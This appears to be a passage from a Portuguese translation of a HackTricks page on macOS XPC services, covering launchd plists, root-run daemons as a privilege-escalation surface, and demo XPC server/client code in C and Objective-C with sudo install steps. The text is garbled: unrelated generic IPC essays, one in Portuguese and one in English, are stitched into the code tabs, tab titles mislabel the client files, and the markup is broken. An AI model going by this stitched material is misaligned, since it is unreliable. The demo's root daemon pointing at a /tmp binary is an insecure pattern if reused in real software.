Como você pode estar pensando, um **componente XPC terá diferentes direitos e privilégios** do que os outros componentes XPC ou o binário principal do aplicativo. EXCETO se um serviço XPC for configurado com [**JoinExistingSession**](https://developer.apple.com/documentation/bundleresources/information\_property\_list/xpcservice/joinexistingsession) definido como "True" em seu arquivo **Info.plist**. Nesse caso, o serviço XPC será executado na mesma sessão de segurança do aplicativo que o chamou.

Os serviços XPC são **iniciados** pelo **launchd** quando necessário e **encerrados** assim que todas as tarefas são **concluídas** para liberar recursos do sistema. **Os componentes XPC específicos do aplicativo só podem ser utilizados pelo aplicativo**, reduzindo assim o risco associado a possíveis vulnerabilidades.

### Serviços XPC em todo o sistema

Os serviços XPC em todo o sistema são acessíveis a todos os usuários. Esses serviços, seja launchd ou do tipo Mach, precisam ser **definidos em arquivos plist** localizados em diretórios especificados, como **`/System/Library/LaunchDaemons`**, **`/Library/LaunchDaemons`**, **`/System/Library/LaunchAgents`** ou **`/Library/LaunchAgents`**.

Esses arquivos plist terão uma chave chamada **`MachServices`** com o nome do serviço e uma chave chamada **`Program`** com o caminho para o binário:
```xml
cat /Library/LaunchDaemons/com.jamf.management.daemon.plist

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Program</key>
<string>/Library/Application Support/JAMF/Jamf.app/Contents/MacOS/JamfDaemon.app/Contents/MacOS/JamfDaemon</string>
<key>AbandonProcessGroup</key>
<true/>
<key>KeepAlive</key>
<true/>
<key>Label</key>
<string>com.jamf.management.daemon</string>
<key>MachServices</key>
<dict>
<key>com.jamf.management.daemon.aad</key>
<true/>
<key>com.jamf.management.daemon.agent</key>
<true/>
<key>com.jamf.management.daemon.binary</key>
<true/>
<key>com.jamf.management.daemon.selfservice</key>
<true/>
<key>com.jamf.management.daemon.service</key>
<true/>
</dict>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Os que estão em **`LaunchDameons`** são executados pelo root. Portanto, se um processo não privilegiado puder se comunicar com um deles, ele poderá ser capaz de escalar privilégios.

### Mensagens de Evento XPC

Os aplicativos podem **se inscrever** em diferentes **mensagens de evento**, permitindo que sejam **iniciados sob demanda** quando esses eventos ocorrem. A **configuração** desses serviços é feita em arquivos **plist do launchd**, localizados nos **mesmos diretórios que os anteriores** e contendo uma chave extra **`LaunchEvent`**.

### Verificação do Processo de Conexão XPC

Quando um processo tenta chamar um método via uma conexão XPC, o **serviço XPC deve verificar se esse processo tem permissão para se conectar**. Aqui estão as maneiras comuns de verificar isso e as armadilhas comuns:

{% content-ref url="macos-xpc-connecting-process-check.md" %}
[macos-xpc-connecting-process-check.md](macos-xpc-connecting-process-check.md)
{% endcontent-ref %}

### Autorização XPC

A Apple também permite que os aplicativos **configurem alguns direitos e como obtê-los** para que, se o processo de chamada os tiver, ele possa ser **autorizado a chamar um método** do serviço XPC:

{% content-ref url="macos-xpc-authorization.md" %}
[macos-xpc-authorization.md](macos-xpc-authorization.md)
{% endcontent-ref %}

### Exemplo de Código C

{% tabs %}
{% tab title="xpc_server.c" %}
```c
// gcc xpc_server.c -o xpc_server

#include <xpc/xpc.h>

static void handle_event(xpc_object_t event) {
if (xpc_get_type(event) == XPC_TYPE_DICTIONARY) {
// Print received message
const char* received_message = xpc_dictionary_get_string(event, "message");
printf("Received message: %s\n", received_message);

// Create a response dictionary
xpc_object_t response = xpc_dictionary_create(NULL, NULL, 0);
xpc_dictionary_set_string(response, "received", "received");

// Send response
xpc_connection_t remote = xpc_dictionary_get_remote_connection(event);
xpc_connection_send_message(remote, response);

// Clean up
xpc_release(response);
}
}

static void handle_connection(xpc_connection_t connection) {
xpc_connection_set_event_handler(connection, ^(xpc_object_t event) {
handle_event(event);
});
xpc_connection_resume(connection);
}

int main(int argc, const char *argv[]) {
xpc_connection_t service = xpc_connection_create_mach_service("xyz.hacktricks.service",
dispatch_get_main_queue(),
XPC_CONNECTION_MACH_SERVICE_LISTENER);
if (!service) {
fprintf(stderr, "Failed to create service.\n");
exit(EXIT_FAILURE);
}

xpc_connection_set_event_handler(service, ^(xpc_object_t event) {
xpc_type_t type = xpc_get_type(event);
if (type == XPC_TYPE_CONNECTION) {
handle_connection(event);
}
});

xpc_connection_resume(service);
dispatch_main();

return 0;
}
```
{% endtab %}

{% tab title="xpc_server.c" %}
```c
// gcc xpc_client.c -o xpc_client

#include <xpc/xpc.h>

int main(int argc, const char *argv[]) {
xpc_connection_t connection = xpc_connection_create_mach_service("xyz.hacktricks.service", NULL, XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);

xpc_connection_set_event_handler(connection, ^(xpc_object_t event) {
if (xpc_get_type(event) == XPC_TYPE_DICTIONARY) {
// Print received message
const char* received_message = xpc_dictionary_get_string(event, "received");
printf("Received message: %s\n", received_message);
}
});

xpc_connection_resume(connection);

xpc_object_t message = xpc_dictionary_create(NULL, NULL, 0);
xpc_dictionary_set_string(message, "message", "Hello, Server!");

xpc_connection_send_message(connection, message);

dispatch_main();

return 0;
}
```
{% endtab %}

Você pode encontrar o arquivo original em inglês abaixo:

{% tab title="README.md" %}

# Comunicação Interprocesso (IPC) no macOS

O macOS fornece vários mecanismos de IPC para permitir que os processos se comuniquem entre si. Esses mecanismos incluem:

* **Mach Messages**: um mecanismo de IPC de baixo nível que permite que os processos se comuniquem diretamente com o kernel do macOS.
* **XPC**: um mecanismo de IPC de nível superior que permite que os processos se comuniquem com outros processos em um ambiente sandboxed.
* **Distributed Objects (DO)**: um mecanismo de IPC de nível superior que permite que os processos se comuniquem com outros processos em diferentes máquinas.

## Mach Messages

O Mach Messages é um mecanismo de IPC de baixo nível que permite que os processos se comuniquem diretamente com o kernel do macOS. O Mach Messages é usado por muitos componentes do macOS, incluindo o launchd, que é o processo pai de todos os processos do usuário no macOS.

Os processos podem enviar mensagens para outros processos usando o Mach Messages. As mensagens podem conter dados e podem ser enviadas de forma síncrona ou assíncrona. As mensagens também podem ser enviadas para portas Mach, que são objetos que representam canais de comunicação entre processos.

Os processos podem criar portas Mach e compartilhá-las com outros processos. Isso permite que os processos se comuniquem diretamente uns com os outros sem a necessidade de intermediários.

Os processos também podem usar as notificações Mach para serem notificados quando ocorrem eventos específicos, como a chegada de uma nova mensagem.

## XPC

O XPC é um mecanismo de IPC de nível superior que permite que os processos se comuniquem com outros processos em um ambiente sandboxed. O XPC é usado por muitos componentes do macOS, incluindo o launchd.

Os processos podem enviar mensagens XPC para outros processos. As mensagens XPC podem conter dados e podem ser enviadas de forma síncrona ou assíncrona. As mensagens XPC também podem ser enviadas para conexões XPC, que são objetos que representam canais de comunicação entre processos.

Os processos podem criar conexões XPC e compartilhá-las com outros processos. Isso permite que os processos se comuniquem diretamente uns com os outros sem a necessidade de intermediários.

## Distributed Objects (DO)

O DO é um mecanismo de IPC de nível superior que permite que os processos se comuniquem com outros processos em diferentes máquinas. O DO é usado por muitos componentes do macOS, incluindo o Bonjour e o Remote Apple Events.

Os processos podem enviar mensagens DO para outros processos. As mensagens DO podem conter dados e podem ser enviadas de forma síncrona ou assíncrona. As mensagens DO também podem ser enviadas para proxies DO, que são objetos que representam canais de comunicação entre processos.

Os processos podem criar proxies DO e compartilhá-los com outros processos. Isso permite que os processos se comuniquem diretamente uns com os outros em diferentes máquinas sem a necessidade de intermediários.

## Referências

* [Mach Messages](https://developer.apple.com/library/archive/documentation/Darwin/Conceptual/KernelProgramming/Mach/Mach.html)
* [XPC Services](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingXPCServices.html)
* [Distributed Objects Programming Topics](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/DistrObjects/Introduction/Introduction.html)

{% endtab %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>Label</key>
<string>xyz.hacktricks.service</string>
<key>MachServices</key>
<dict>
<key>xyz.hacktricks.service</key>
<true/>
</dict>
<key>Program</key>
<string>/tmp/xpc_server</string>
<key>ProgramArguments</key>
<array>
<string>/tmp/xpc_server</string>
</array>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}
```bash
# Compile the server & client
gcc xpc_server.c -o xpc_server
gcc xpc_client.c -o xpc_client

# Save server on it's location
cp xpc_server /tmp

# Load daemon
sudo cp xyz.hacktricks.service.plist /Library/LaunchDaemons
sudo launchctl load /Library/LaunchDaemons/xyz.hacktricks.service.plist

# Call client
./xpc_client

# Clean
sudo launchctl unload /Library/LaunchDaemons/xyz.hacktricks.service.plist
sudo rm /Library/LaunchDaemons/xyz.hacktricks.service.plist /tmp/xpc_server
```
### Exemplo de Código ObjectiveC

{% tabs %}
{% tab title="oc_xpc_server.m" %}
```objectivec
// gcc -framework Foundation oc_xpc_server.m -o oc_xpc_server
#include <Foundation/Foundation.h>

@protocol MyXPCProtocol
- (void)sayHello:(NSString *)some_string withReply:(void (^)(NSString *))reply;
@end

@interface MyXPCObject : NSObject <MyXPCProtocol>
@end


@implementation MyXPCObject
- (void)sayHello:(NSString *)some_string withReply:(void (^)(NSString *))reply {
NSLog(@"Received message: %@", some_string);
NSString *response = @"Received";
reply(response);
}
@end

@interface MyDelegate : NSObject <NSXPCListenerDelegate>
@end


@implementation MyDelegate

- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection {
newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(MyXPCProtocol)];

MyXPCObject *my_object = [MyXPCObject new];

newConnection.exportedObject = my_object;

[newConnection resume];
return YES;
}
@end

int main(void) {

NSXPCListener *listener = [[NSXPCListener alloc] initWithMachServiceName:@"xyz.hacktricks.svcoc"];

id <NSXPCListenerDelegate> delegate = [MyDelegate new];
listener.delegate = delegate;
[listener resume];

sleep(10); // Fake something is done and then it ends
}
```
{% endtab %}

{% tab title="oc_xpc_server.m" %}
```objectivec
// gcc -framework Foundation oc_xpc_client.m -o oc_xpc_client
#include <Foundation/Foundation.h>

@protocol MyXPCProtocol
- (void)sayHello:(NSString *)some_string withReply:(void (^)(NSString *))reply;
@end

int main(void) {
NSXPCConnection *connection = [[NSXPCConnection alloc] initWithMachServiceName:@"xyz.hacktricks.svcoc" options:NSXPCConnectionPrivileged];
connection.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(MyXPCProtocol)];
[connection resume];

[[connection remoteObjectProxy] sayHello:@"Hello, Server!" withReply:^(NSString *response) {
NSLog(@"Received response: %@", response);
}];

[[NSRunLoop currentRunLoop] run];

return 0;
}
```
{% endtab %}

{% tab title="macOS IPC (Inter-Process Communication)" %}
# macOS IPC (Inter-Process Communication)

Inter-Process Communication (IPC) is a mechanism that allows processes to communicate with each other and share data. macOS provides several IPC mechanisms, including:

* Mach ports
* UNIX domain sockets
* Distributed Objects
* XPC services

Each of these mechanisms has its own strengths and weaknesses, and each is suited to different use cases.

## Mach Ports

Mach ports are a low-level IPC mechanism that is used extensively by macOS. Mach ports are used to implement many of the higher-level IPC mechanisms, including Distributed Objects and XPC services.

Mach ports are identified by a port name, which is a 32-bit integer. Ports can be created, destroyed, and passed between processes. Ports can also be used to send and receive messages.

Mach ports can be used to implement a wide range of IPC patterns, including request/response, publish/subscribe, and message queues.

## UNIX Domain Sockets

UNIX domain sockets are a type of IPC mechanism that is commonly used on UNIX-based systems. UNIX domain sockets are similar to network sockets, but they are used for communication between processes on the same system.

UNIX domain sockets are identified by a file path. Processes can create sockets, bind them to a file path, and then use them to send and receive data.

UNIX domain sockets are well-suited to implementing client/server architectures, where a server process listens on a socket and multiple client processes connect to it.

## Distributed Objects

Distributed Objects is a high-level IPC mechanism that is built on top of Mach ports. Distributed Objects allows objects to be passed between processes, and it provides a transparent mechanism for remote method invocation.

Distributed Objects is well-suited to implementing distributed systems, where multiple processes need to work together to accomplish a task.

## XPC Services

XPC Services is a high-level IPC mechanism that is built on top of Mach ports. XPC Services allows processes to launch and communicate with other processes in a secure and controlled manner.

XPC Services are used extensively by macOS to implement system services, such as the Spotlight indexer and the Dock.

## Conclusion

IPC is a fundamental mechanism for building complex systems on macOS. By understanding the strengths and weaknesses of each IPC mechanism, you can choose the right mechanism for your use case and build robust and secure systems.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>Label</key>
<string>xyz.hacktricks.svcoc</string>
<key>MachServices</key>
<dict>
<key>xyz.hacktricks.svcoc</key>
<true/>
</dict>
<key>Program</key>
<string>/tmp/oc_xpc_server</string>
<key>ProgramArguments</key>
<array>
<string>/tmp/oc_xpc_server</string>
</array>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}
```bash
# Compile the server & client
gcc -framework Foundation oc_xpc_server.m -o oc_xpc_server
gcc -framework Foundation oc_xpc_client.m -o oc_xpc_client

# Save server on it's location
cp oc_xpc_server /tmp

# Load daemon
sudo cp xyz.hacktricks.svcoc.plist /Library/LaunchDaemons
sudo launchctl load /Library/LaunchDaemons/xyz.hacktricks.svcoc.plist

# Call client
./oc_xpc_client

# Clean
sudo launchctl unload /Library/LaunchDaemons/xyz.hacktricks.svcoc.plist
sudo rm /Library/LaunchDaemons/xyz.hacktricks.svcoc.plist /tmp/oc_xpc_server
```
## Referências

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
